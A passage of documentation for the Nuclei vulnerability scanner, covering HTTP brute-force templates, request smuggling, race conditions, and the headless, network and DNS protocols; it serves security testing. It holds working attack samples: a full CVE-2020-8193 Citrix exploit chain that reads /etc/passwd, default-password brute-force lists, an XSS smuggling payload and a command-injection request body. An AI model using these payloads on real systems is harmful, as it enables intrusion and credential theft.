More details [here](https://www.sjoerdlangkemper.nl/2017/08/02/burp-intruder-attack-types/).

[​](#attack-mode-example)Attack Mode Example
--------------------------------------------

An example of the using `clusterbomb` attack to fuzz.

```
http:
  - raw:
      - |
        POST /?file={{path}} HTTP/1.1
        User-Agent: {{header}}
        Host: {{Hostname}}

    attack: clusterbomb # Defining HTTP fuzz attack type
    payloads:
      path: helpers/wordlists/prams.txt
      header: helpers/wordlists/header.txt

```


HTTP Payloads

HTTP Payloads Examples
======================

Review some HTTP payload examples for Nuclei

[​](#http-intruder-bruteforcing)HTTP Intruder Bruteforcing
----------------------------------------------------------

This template makes a defined POST request in RAW format along with in template defined payloads running `clusterbomb` intruder and checking for string match against response.

```
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

# HTTP Intruder bruteforcing with in template payload support. 

http:

  - raw:
      - |
        POST /?username=§username§&paramb=§password§ HTTP/1.1
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5)
        Host: {{Hostname}}
        another_header: {{base64('§password§')}}
        Accept: */*

        body=test

    payloads:
      username:
        - admin

      password:
        - admin
        - guest
        - password
        - test
        - 12345
        - 123456

    attack: clusterbomb # Available: batteringram,pitchfork,clusterbomb

    matchers:
      - type: word
        words:
          - "Test is test matcher text"

```

[​](#bruteforcing-multiple-requests)BruteForcing multiple requests
------------------------------------------------------------------

This template makes a defined POST request in RAW format along with wordlist based payloads running `clusterbomb` intruder and checking for string match against response.

```
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

http:

  - raw:
      - |
        POST /?param_a=§param_a§&paramb=§param_b§ HTTP/1.1
        User-Agent: §param_a§
        Host: {{Hostname}}
        another_header: {{base64('§param_b§')}}
        Accept: */*

        admin=test

      - |
        DELETE / HTTP/1.1
        User-Agent: nuclei
        Host: {{Hostname}}

        {{sha256('§param_a§')}} 

      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}

        {{html_escape('§param_a§')}} + {{hex_encode('§param_b§'))}}

    attack: clusterbomb # Available types: batteringram,pitchfork,clusterbomb
    payloads:
      param_a: payloads/prams.txt
      param_b: payloads/paths.txt

    matchers:
      - type: word
        words:
          - "Test is test matcher text"

```

[​](#authenticated-bruteforcing)Authenticated Bruteforcing
----------------------------------------------------------

This template makes a subsequent HTTP requests with defined requests maintaining sessions between each request and checking for string match against response.

```
id: multiple-raw-example
info:
  name: Test RAW Template
  author: pdteam
  severity: info

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

      - |
        POST /testing HTTP/1.1
        Host: {{Hostname}}
        Origin: {{BaseURL}}

        testing=parameter

    cookie-reuse: true # Cookie-reuse maintain the session between all request like browser. 
    matchers:
      - type: word
        words:
          - "Test is test matcher text"

```


Advanced HTTP

Unsafe HTTP
===========

Learn about using rawhttp or unsafe HTTP with Nuclei

Nuclei supports [rawhttp](https://github.com/projectdiscovery/rawhttp) for complete request control and customization allowing **any kind of malformed requests** for issues like HTTP request smuggling, Host header injection, CRLF with malformed characters and more.

**rawhttp** library is disabled by default and can be enabled by including `unsafe: true` in the request block.

Here is an example of HTTP request smuggling detection template using `rawhttp`.

```
http:
  - raw:
    - |+
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 150
        Transfer-Encoding: chunked

        0

        GET /post?postId=5 HTTP/1.1
        User-Agent: a"/><script>alert(1)</script>
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 5

        x=1
    - |+
        GET /post?postId=5 HTTP/1.1
        Host: {{Hostname}}

    unsafe: true # Enables rawhttp client
    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "<script>alert(1)</script>")'

```


Advanced HTTP

Value Sharing
=============

Learn about sharing values between HTTP requests in the HTTP template.

[​](#http-value-sharing)HTTP Value Sharing
------------------------------------------

In Nuclei, It is possible to extract value from one HTTP request and share/reuse it in another HTTP request. This has various use-cases like login, CSRF tokens and other complex.

This concept of value sharing is possible using [Dynamic Extractors](/templates/reference/extractors#dynamic-extractor). Here’s a simple example demonstrating value sharing between HTTP requests.

This template makes a subsequent HTTP requests maintaining sessions between each request, dynamically extracting data from one request and reusing them into another request using variable name and checking for string match against response.

```
id: CVE-2020-8193

info:
  name: Citrix unauthenticated LFI
  author: pdteam
  severity: high
  reference: https://github.com/jas502n/CVE-2020-8193

http:
  - raw:
      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/xml
        X-NITRO-USER: xpyZxwy6
        X-NITRO-PASS: xWXHUJ56

        <appfwprofile><login></login></appfwprofile>

      - |
        GET /menu/ss?sid=nsroot&username=nsroot&force_setup=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/neo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        GET /menu/stc HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close

      - |
        POST /pcidss/report?type=allprofiles&sid=loginchallengeresponse1requestbody&username=nsroot&set=1 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <appfwprofile><login></login></appfwprofile>

      - |
        POST /rapi/filedownload?filter=path:%2Fetc%2Fpasswd HTTP/1.1
        Host: {{Hostname}}
        User-Agent: python-requests/2.24.0
        Accept: */*
        Connection: close
        Content-Type: application/xml
        X-NITRO-USER: oY39DXzQ
        X-NITRO-PASS: ZuU9Y9c1
        rand_key: §randkey§

        <clipermission></clipermission>

    cookie-reuse: true # Using cookie-reuse to maintain session between each request, same as browser.

    extractors:
      - type: regex
        name: randkey # Variable name
        part: body
        internal: true
        regex:
          - "(?m)[0-9]{3,10}\\.[0-9]+"

    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body

```


Advanced HTTP

Connection Tampering
====================

Learn more about using HTTP pipelining and connection pooling with Nuclei

### [​](#pipelining)Pipelining

HTTP Pipelining support has been added which allows multiple HTTP requests to be sent on the same connection inspired from [http-desync-attacks-request-smuggling-reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn).

Before running HTTP pipelining based templates, make sure the running target supports HTTP Pipeline connection, otherwise nuclei engine fallbacks to standard HTTP request engine.

If you want to confirm the given domain or list of subdomains supports HTTP Pipelining, [httpx](https://github.com/projectdiscovery/) has a flag `-pipeline` to do so.

An example configuring showing pipelining attributes of nuclei.

```
    unsafe: true
    pipeline: true
    pipeline-concurrent-connections: 40
    pipeline-requests-per-connection: 25000

```

An example template demonstrating pipelining capabilities of nuclei has been provided below-

```
id: pipeline-testing
info:
  name: pipeline testing
  author: pdteam
  severity: info

http:
  - raw:
      - |+
        GET /{{path}} HTTP/1.1
        Host: {{Hostname}}
        Referer: {{BaseURL}}

    attack: batteringram
    payloads:
      path: path_wordlist.txt

    unsafe: true
    pipeline: true
    pipeline-concurrent-connections: 40
    pipeline-requests-per-connection: 25000

    matchers:
      - type: status
        part: header
        status:
          - 200

```
### [​](#connection-pooling)Connection pooling

While the earlier versions of nuclei did not do connection pooling, users can now configure templates to either use HTTP connection pooling or not. This allows for faster scanning based on requirement.

To enable connection pooling in the template, `threads` attribute can be defined with respective number of threads you wanted to use in the payloads sections.

`Connection: Close` header can not be used in HTTP connection pooling template, otherwise engine will fail and fallback to standard HTTP requests with pooling.

An example template using HTTP connection pooling-

```
id: fuzzing-example
info:
  name: Connection pooling example
  author: pdteam
  severity: info

http:

  - raw:
      - |
        GET /protected HTTP/1.1
        Host: {{Hostname}}
        Authorization: Basic {{base64('admin:§password§')}}

    attack: batteringram
    payloads:
      password: password.txt
    threads: 40

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Unique string"
        part: body

```


Advanced HTTP

Request Tampering
=================

Learn about request tampering in HTTP with Nuclei

[​](#requests-annotation)Requests Annotation
--------------------------------------------

Request inline annotations allow performing per request properties/behavior override. They are very similar to python/java class annotations and must be put on the request just before the RFC line. Currently, only the following overrides are supported:

* `@Host:` which overrides the real target of the request (usually the host/ip provided as input). It supports syntax with ip/domain, port, and scheme, for example: `domain.tld`, `domain.tld:port`, `http://domain.tld:port`
* `@tls-sni:` which overrides the SNI Name of the TLS request (usually the hostname provided as input). It supports any literals. The special value `request.host` uses the `Host` header and `interactsh-url` uses an interactsh generated URL.
* `@timeout:` which overrides the timeout for the request to a custom duration. It supports durations formatted as string. If no duration is specified, the default Timeout flag value is used.

The following example shows the annotations within a request:

```
- |
  @Host: https://projectdiscovery.io:443
  POST / HTTP/1.1
  Pragma: no-cache
  Host: {{Hostname}}
  Cache-Control: no-cache, no-transform
  User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

```

This is particularly useful, for example, in the case of templates with multiple requests, where one request after the initial one needs to be performed to a specific host (for example, to check an API validity):

```
http:
  - raw:
      # this request will be sent to {{Hostname}} to get the token
      - |
        GET /getkey HTTP/1.1
        Host: {{Hostname}}
        
      # This request will be sent instead to https://api.target.com:443 to verify the token validity
      - |
        @Host: https://api.target.com:443
        GET /api/key={{token}} HTTP/1.1
        Host: api.target.com:443

    extractors:
      - type: regex
        name: token
        part: body
        regex:
          # random extractor of strings between prefix and suffix
          - 'prefix(.*)suffix'

    matchers:
      - type: word
        part: body
        words:
          - valid token

```

Example of a custom `timeout` annotations -

```
- |
  @timeout: 25s
  POST /conf_mail.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M

```

Example of `sni` annotation with `interactsh-url` -

```
- |
  @tls-sni: interactsh-url
  POST /conf_mail.php HTTP/1.1
  Host: {{Hostname}}
  Content-Type: application/x-www-form-urlencoded
  
  mail_address=%3B{{cmd}}%3B&button=%83%81%81%5B%83%8B%91%97%90M

```

[​](#smuggling)Smuggling
------------------------

HTTP Smuggling is a class of Web-Attacks recently made popular by [Portswigger’s Research](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) into the topic. For an in-depth overview, please visit the article linked above.

In the open source space, detecting http smuggling is difficult particularly due to the requests for detection being malformed by nature. Nuclei is able to reliably detect HTTP Smuggling vulnerabilities utilising the [rawhttp](https://github.com/projectdiscovery/rawhttp) engine.

The most basic example of an HTTP Smuggling vulnerability is CL.TE Smuggling. An example template to detect a CE.TL HTTP Smuggling vulnerability is provided below using the `unsafe: true` attribute for rawhttp based requests.

```
id: CL-TE-http-smuggling

info:
  name: HTTP request smuggling, basic CL.TE vulnerability
  author: pdteam
  severity: info
  reference: https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te

http:
  - raw:
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G      
    - |+
      POST / HTTP/1.1
      Host: {{Hostname}}
      Connection: keep-alive
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 6
      Transfer-Encoding: chunked
      
      0
      
      G
            
    unsafe: true
    matchers:
      - type: word
        words:
          - 'Unrecognized method GPOST'

```

More complete examples are provided [here](/templates/protocols/http/http-smuggling-examples)


Advanced HTTP

Race Conditions
===============

Learn about using race conditions with Nuclei

Race Conditions are another class of bugs not easily automated via traditional tooling. Burp Suite introduced a Gate mechanism to Turbo Intruder where all the bytes for all the requests are sent expect the last one at once which is only sent together for all requests synchronizing the send event.

We have implemented **Gate** mechanism in nuclei engine and allow them run via templates which makes the testing for this specific bug class simple and portable.

To enable race condition check within template, `race` attribute can be set to `true` and `race_count` defines the number of simultaneous request you want to initiate.

Below is an example template where the same request is repeated for 10 times using the gate logic.

```
id: race-condition-testing

info:
  name: Race condition testing
  author: pdteam
  severity: info

http:
  - raw:
      - |
        POST /coupons HTTP/1.1
        Host: {{Hostname}}

        promo_code=20OFF        

    race: true
    race_count: 10

    matchers:
      - type: status
        part: header
        status:
          - 200

```

You can simply replace the `POST` request with any suspected vulnerable request and change the `race_count` as per your need, and it’s ready to run.

```
nuclei -t race.yaml -target https://api.target.com

```

**Multi request race condition testing**

For the scenario when multiple requests needs to be sent in order to exploit the race condition, we can make use of threads.

```
    threads: 5
    race: true

```

`threads` is a total number of request you wanted make with the template to perform race condition testing.

Below is an example template where multiple (5) unique request will be sent at the same time using the gate logic.

```
id: multi-request-race

info:
  name: Race condition testing with multiple requests
  author: pd-team
  severity: info

http:
  - raw:  
      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=1
        
      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=2

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=3

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=4

      - |
        POST / HTTP/1.1
        Pragma: no-cache
        Host: {{Hostname}}
        Cache-Control: no-cache, no-transform
        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0

        id=5

    threads: 5
    race: true

```

More complete examples are provided [here](/templates/protocols/http/http-race-condition-examples)


Protocols

Headless Protocol
=================

Learn about using a headless browser with Nuclei

Nuclei supports automation of a browser with simple DSL. Headless browser engine can be fully customized and user actions can be scripted allowing complete control over the browser. This allows for a variety of unique and custom workflows.

```
# Start the requests for the template right here
headless:

```

[​](#actions)Actions
--------------------

An action is a single piece of Task for the Nuclei Headless Engine. Each action manipulates the browser state in some way, and finally leads to the state that we are interested in capturing.

Nuclei supports a variety of actions. A list of these Actions along with their arguments are given below:

### [​](#navigate)navigate

Navigate visits a given URL. url field supports variables like `{{BaseURL}}`, `{{Hostname}}` to customize the request fully.

```
action: navigate
args: 
  url: "{{BaseURL}}

```
### [​](#script)script

Script runs a JS code on the current browser page. At the simplest level, you can just provide a `code` argument with the JS snippet you want to execute, and it will be run on the page.

```
action: script
args:
  code: alert(document.domain)

```

Suppose you want to run a matcher on a JS object to inspect its value. This type of data extraction use cases are also supported with nuclei headless. As an example, let’s say the application sets an object called `window.random-object` with a value, and you want to match on that value.

```
- action: script
  args:
    code: window.random-object
  name: script-name
...
matchers:
  - type: word
    part: script-name
    words:
      - "some-value"

```

Nuclei supports running some custom Javascript, before the page load with the `hook` argument. This will always run the provided Javascript, before any of the pages load.

The example provided hooks `window.alert` so that the alerts that are generated by the application do not stop the crawler.

```
- action: script
  args:
    code: (function() { window.alert=function(){} })()
    hook: true

```

This is one use case, there are many more use cases of function hooking such as DOM XSS Detection and Javascript-Injection based testing techniques. Further examples are provided on examples page.

### [​](#click)click

Click simulates clicking with the Left-Mouse button on an element specified by a selector.

```
action: click
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input

```

Nuclei supports a variety of selector types, including but not limited to XPath, Regex, CSS, etc. For more information about selectors, see [here](/_sites/docs.projectdiscovery.io/templates/protocols/headless#selectors).

### [​](#rightclick)rightclick

RightClick simulates clicking with the Right-Mouse button on an element specified by a selector.

```
action: rightclick
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input

```
### [​](#text)text

Text simulates typing something into an input with Keyboard. Selectors can be used to specify the element to type in.

```
action: text
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input
  value: username

```
### [​](#screenshot)screenshot

Screenshots takes the screenshots of a page and writes it to disk. It supports both full page and normal screenshots.

```
action: screenshot
args: 
  to: /root/test/screenshot-web

```

If you require full page screenshot, it can be achieved with `fullpage: true` option in the args.

```
action: screenshot
args: 
  to: /root/test/screenshot-web
  fullpage: true

```
### [​](#time)time

Time enters values into time inputs on pages in RFC3339 format.

```
action: time
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input
  value: 2006-01-02T15:04:05Z07:00

```
### [​](#select)select

Select performs selection on an HTML Input by a selector.

```
action: select
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input
  selected: true
  value: option[value=two]
  selector: regex

```
### [​](#files)files

Files handles a file upload input on the webpage.

```
action: files
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input
  value: /root/test/payload.txt

```
### [​](#waitfcp)waitfcp

WaitFCP waits for the first piece of meaningful content, such as text or an image, indicating that the page is becoming useful.

```
action: waitfcp

```
### [​](#waitfmp)waitfmp

WaitFMP waits for the First Meaningful Paint event, allowing users to proceed when content is visually ready.

```
action: waitfmp

```
### [​](#waitdom)waitdom

WaitDOM waits for the `DOMContentLoaded` event, indicating that the HTML has been loaded and parsed, but without waiting for stylesheets, images, and subframes to finish loading.

```
action: waitdom

```
### [​](#waitload)waitload

WaitLoad waits the entire page, including dependent resources like stylesheets and images, has been fully loaded.

```
action: waitload

```
### [​](#waitidle)waitidle

WaitIdle waits until the page completely stopped making network requests and reaches a network idle state, indicating that all resources have been loaded.

```
action: waitidle

```
### [​](#waitstable)waitstable

WaitStable waits until the page is stable for *N* duration *(default is `1s`)*.

```
action: waitstable
args:
  duration: 5s

```
### [​](#waitdialog)waitdialog

WaitDialog will wait for a JavaScript dialog (`alert`, `confirm`, `prompt`, or `onbeforeunload`) to be initialized and then automatically accept it.

```
action: waitdialog
name: alert
args:
  max-duration: 5s # (Optional. Default 10s.)

```

This action is useful for detecting triggered XSS payloads with a high level of accuracy and a low rate of false positives.

The `name` property MUST be explicitly defined to ensure the output variable is available for later use by `matchers` or `extractors` wihtin your template. See the example [here](/templates/protocols/headless-examples#xss-detection).

**Output variables:**

* **NAME** *(boolean)*, indicator of JavaScript dialog triggered.
* **NAME\_type** *(string)*, dialog type (`alert`, `confirm`, `prompt`, or `onbeforeunload`).
* **NAME\_message** *(string)*, displayed message dialog.

### [​](#getresource)getresource

GetResource returns the src attribute for an element.

```
action: getresource
name: extracted-value-src
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input

```
### [​](#extract)extract

Extract extracts either the Text for an HTML Node, or an attribute as specified by the user.

The below code will extract the Text for the given XPath Selector Element, which can then also be matched upon by name `extracted-value` with matchers and extractors.

```
action: extract
name: extracted-value
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input

```

An attribute can also be extracted for an element. For example -

```
action: extract
name: extracted-value-href
args: 
  by: xpath
  xpath: /html/body/div[1]/div[3]/form/div[2]/div[1]/div[1]/div/div[2]/input
  target: attribute
  attribute: href

```
### [​](#setmethod)setmethod

SetMethod overrides the method for the request.

```
action: setmethod
args: 
  part: request
  method: DELETE

```
### [​](#addheader)addheader

AddHeader adds a header to the requests / responses. This does not overwrite any pre-existing headers.

```
action: addheader
args: 
  part: response # can be request too
  key: Content-Security-Policy
  value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"

```
### [​](#setheader)setheader

SetHeader sets a header in the requests / responses.

```
action: setheader
args: 
  part: response # can be request too
  key: Content-Security-Policy
  value: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"

```
### [​](#deleteheader)deleteheader

DeleteHeader deletes a header from requests / responses.

```
action: deleteheader
args: 
  part: response # can be request too
  key: Content-Security-Policy

```
### [​](#setbody)setbody

SetBody sets the body for a request / response.

```
action: setbody
args: 
  part: response # can be request too
  body: '{"success":"ok"}'

```
### [​](#waitevent)waitevent

WaitEvent waits for an event to trigger on the page.

```
action: waitevent
args: 
  event: 'Page.loadEventFired'

```

The list of events supported are listed [here](https://github.com/go-rod/rod/blob/master/lib/proto/definitions.go).

### [​](#keyboard)keyboard

Keyboard simulates a single key-press on the keyboard.

```
action: keyboard
args: 
  keys: '\r' # this simulates pressing enter key on keyboard

```

`keys` argument accepts key-codes.

### [​](#debug)debug

Debug adds a delay of 5 seconds between each headless action and also shows a trace of all the headless events occurring in the browser.

> Note: Only use this for debugging purposes, don’t use this in production templates.

```
action: debug

```
### [​](#sleep)sleep

Sleeps makes the browser wait for a specified duration in seconds. This is also useful for debugging purposes.

```
action: sleep
args:
  duration: 5

```

[​](#selectors)Selectors
------------------------

Selectors are how nuclei headless engine identifies what element to execute an action on. Nuclei supports getting selectors by including a variety of options -

| Selector | Description |
| --- | --- |
| `r` / `regex` | Element matches CSS Selector and Text Matches Regex |
| `x` / `xpath` | Element matches XPath selector |
| `js` | Return elements from a JS function |
| `search` | Search for a query (can be text, XPATH, CSS) |
| `selector` (default) | Element matches CSS Selector |

[​](#matchers-extractor-parts)Matchers / Extractor Parts
--------------------------------------------------------

Valid `part` values supported by **Headless** protocol for Matchers / Extractor are -

| Value | Description |
| --- | --- |
| request | Headless Request |
| `<out_names>` | Action names with stored values |
| raw / body / data | Final DOM response from browser |

[​](#example-headless-templates)Example Headless Templates
----------------------------------------------------------

An example headless template to automatically login into DVWA is provided below -

```
id: dvwa-headless-automatic-login

info:
  name: DVWA Headless Automatic Login
  author: pdteam
  severity: high

headless:
  - steps:
      - args:
          url: "{{BaseURL}}/login.php"
        action: navigate
      - action: waitload
      - args:
          by: xpath
          xpath: /html/body/div/div[2]/form/fieldset/input
        action: click
      - action: waitload
      - args:
          by: xpath
          value: admin
          xpath: /html/body/div/div[2]/form/fieldset/input
        action: text
      - args:
          by: xpath
          xpath: /html/body/div/div[2]/form/fieldset/input[2]
        action: click
      - action: waitload
      - args:
          by: xpath
          value: password
          xpath: /html/body/div/div[2]/form/fieldset/input[2]
        action: text
      - args:
          by: xpath
          xpath: /html/body/div/div[2]/form/fieldset/p/input
        action: click
      - action: waitload
    matchers:
      - part: resp
        type: word
        words:
          - "You have logged in as"

```

More complete examples are provided [here](/templates/protocols/headless-examples).


Protocols

Network Protocol
================

Learn about network requests with Nuclei

Nuclei can act as an automatable **Netcat**, allowing users to send bytes across the wire and receive them, while providing matching and extracting capabilities on the response.

Network Requests start with a **network** block which specifies the start of the requests for the template.

```
# Start the requests for the template right here
tcp:

```
### [​](#inputs)Inputs

First thing in the request is **inputs**. Inputs are the data that will be sent to the server, and optionally any data to read from the server.

At its most simple, just specify a string, and it will be sent across the network socket.

```
# inputs is the list of inputs to send to the server
inputs: 
  - data: "TEST\r\n"

```

You can also send hex encoded text that will be first decoded and the raw bytes will be sent to the server.

```
inputs:
  - data: "50494e47"
    type: hex
  - data: "\r\n"

```

Helper function expressions can also be defined in input and will be first evaluated and then sent to the server. The last Hex Encoded example can be sent with helper functions this way -

```
inputs:
  - data: 'hex_decode("50494e47")\r\n'

```

One last thing that can be done with inputs is reading data from the socket. Specifying `read-size` with a non-zero value will do the trick. You can also assign the read data some name, so matching can be done on that part.

```
inputs:
  - read-size: 8

```

Example with reading a number of bytes, and only matching on them.

```
inputs:
  - read-size: 8
    name: prefix
...
matchers:
  - type: word
    part: prefix
    words: 
      - "CAFEBABE"

```

Multiple steps can be chained together in sequence to do network reading / writing.

### [​](#host)Host

The next part of the requests is the **host** to connect to. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with `{{` and end with `}}` and are case-sensitive.

1. **Hostname** - variable is replaced by the hostname provided on command line.

An example name value:

```
host: 
  - "{{Hostname}}"

```

Nuclei can also do TLS connection to the target server. Just add `tls://` as prefix before the **Hostname** and you’re good to go.

```
host:
  - "tls://{{Hostname}}"

```

If a port is specified in the host, the user supplied port is ignored and the template port takes precedence.

### [​](#port)Port

Starting from Nuclei v2.9.15, a new field called `port` has been introduced in network templates. This field allows users to specify the port separately instead of including it in the host field.

Previously, if you wanted to write a network template for an exploit targeting SSH, you would have to specify both the hostname and the port in the host field, like this:

```
host:
  - "{{Hostname}}"
  - "{{Host}}:22"

```

In the above example, two network requests are sent: one to the port specified in the input/target, and another to the default SSH port (22).

The reason behind introducing the port field is to provide users with more flexibility when running network templates on both default and non-default ports. For example, if a user knows that the SSH service is running on a non-default port of 2222 (after performing a port scan with service discovery), they can simply run:

```
$ nuclei -u scanme.sh:2222 -id xyz-ssh-exploit

```

In this case, Nuclei will use port 2222 instead of the default port 22. If the user doesn’t specify any port in the input, port 22 will be used by default. However, this approach may not be straightforward to understand and can generate warnings in logs since one request is expected to fail.

Another issue with the previous design of writing network templates is that requests can be sent to unexpected ports. For example, if a web service is running on port 8443 and the user runs:

```
$ nuclei -u scanme.sh:8443

```

In this case, `xyz-ssh-exploit` template will send one request to `scanme.sh:22` and another request to `scanme.sh:8443`, which may return unexpected responses and eventually result in errors. This is particularly problematic in automation scenarios.

To address these issues while maintaining the existing functionality, network templates can now be written in the following way:

```
host:
  - "{{Hostname}}"
port: 22

```

In this new design, the functionality to run templates on non-standard ports will still exist, except for the default reserved ports (`80`, `443`, `8080`, `8443`, `8081`, `53`). Additionally, the list of default reserved ports can be customized by adding a new field called exclude-ports:

```
exclude-ports: 80,443

```

When `exclude-ports` is used, the default reserved ports list will be overwritten. This means that if you want to run a network template on port `80`, you will have to explicitly specify it in the port field.

Starting from Nuclei v3.1.0 `port` field supports comma seperated values and multi ports can be specified in the port field. For example, if you want to run a network template on port `5432` and `5433`, you can specify it in the port field like this:

```
port: 5432,5433

```

In this case, Nuclei will first check if port is open from list and run template only on open ports

#### [​](#matchers-extractor-parts)Matchers / Extractor Parts

Valid `part` values supported by **Network** protocol for Matchers / Extractor are -

| Value | Description |
| --- | --- |
| request | Network Request |
| data | Final Data Read From Network Socket |
| raw / body / all | All Data received from Socket |

### [​](#example-network-template)**Example Network Template**

The final example template file for a `hex` encoded input to detect MongoDB running on servers with working matchers is provided below.

```
id: input-expressions-mongodb-detect

info:
  name: Input Expression MongoDB Detection
  author: pdteam
  severity: info
  reference: https://github.com/orleven/Tentacle

tcp:
  - inputs:
      - data: "{{hex_decode('3a000000a741000000000000d40700000000000061646d696e2e24636d640000000000ffffffff130000001069736d6173746572000100000000')}}"
    host:
      - "{{Hostname}}"
    port: 27017
    read-size: 2048
    matchers:
      - type: word
        words:
          - "logicalSessionTimeout"
          - "localTime"

```

More complete examples are provided [here](/templates/protocols/network-examples).


Protocols

DNS Protocol
============

Learn about using DNS with Nuclei

DNS protocol can be modelled in Nuclei with ease. Fully Customizable DNS requests can be sent by Nuclei to nameservers and matching/extracting can be performed on their response.

DNS Requests start with a **dns** block which specifies the start of the requests for the template.

```
# Start the requests for the template right here
dns:

```
### [​](#type)Type

First thing in the request is **type**. Request type can be **A**, **NS**, **CNAME**, **SOA**, **PTR**, **MX**, **TXT**, **AAAA**.

```
# type is the type for the dns request
type: A

```
### [​](#name)Name

The next part of the requests is the DNS **name** to resolve. Dynamic variables can be placed in the path to modify its value on runtime. Variables start with `{{` and end with `}}` and are case-sensitive.

1. **FQDN** - variable is replaced by the hostname/FQDN of the target on runtime.

An example name value:

```
name: {{FQDN}}.com
# This value will be replaced on execution with the FQDN.
# If FQDN is https://this.is.an.example then the
# name will get replaced to the following: this.is.an.example.com

```

As of now the tool supports only one name per request.

### [​](#class)Class

Class type can be **INET**, **CSNET**, **CHAOS**, **HESIOD**, **NONE** and **ANY**. Usually it’s enough to just leave it as **INET**.

```
# method is the class for the dns request
class: inet

```
### [​](#recursion)Recursion

Recursion is a boolean value, and determines if the resolver should only return cached results, or traverse the whole dns root tree to retrieve fresh results. Generally it’s better to leave it as **true**.

```
# Recursion is a boolean determining if the request is recursive
recursion: true

```
### [​](#retries)Retries

Retries is the number of attempts a dns query is retried before giving up among different resolvers. It’s recommended a reasonable value, like **3**.

```
# Retries is a number of retries before giving up on dns resolution
retries: 3

```
### [​](#matchers-extractor-parts)Matchers / Extractor Parts

Valid `part` values supported by **DNS** protocol for Matchers / Extractor are -

| Value | Description |
| --- | --- |
| request | DNS Request |
| rcode | DNS Rcode |
| question | DNS Question Message |
| extra | DNS Message Extra Field |
| answer | DNS Message Answer Field |
| ns | DNS Message Authority Field |
| raw / all / body | Raw DNS Message |

### [​](#example-dns-template)**Example DNS Template**

The final example template file for performing `A` query, and check if CNAME and A records are in the response is as follows:

```
id: dummy-cname-a

info:
  name: Dummy A dns request
  author: mzack9999
  severity: info
  description: Checks if CNAME and A record is returned.

dns:
  - name: "{{FQDN}}"
    type: A
    class: inet
    recursion: true
    retries: 3
    matchers:
      - type: word
        words:
          # The response must contain a CNAME record
          - "IN\tCNAME"
          # and also at least 1 A record
          - "IN\tA"
        condition: and

```

More complete examples are provided [here](/templates/protocols/dns-examples)


Protocols

File Protocol
=============

Learn about using Nuclei to work with the local file system

[​](#overview)Overview
----------------------

Nuclei allows modelling templates that can match/extract on the local file system.

```
